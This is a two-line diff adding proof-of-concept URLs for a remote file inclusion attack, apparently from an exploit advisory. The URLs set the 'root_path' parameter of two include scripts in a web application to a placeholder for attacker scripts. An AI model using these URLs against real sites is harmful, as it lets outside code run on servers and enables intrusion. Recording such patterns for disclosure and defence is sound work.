@@ -1,0 +1,2 @@
+http://www.example.com/[ACID_path]/includes/cache_mngt.php?root_path=[evil_scripts]
+http://www.example.com/[ACID_path]/includes/gallery_functions.php?root_path=[evil_scripts]
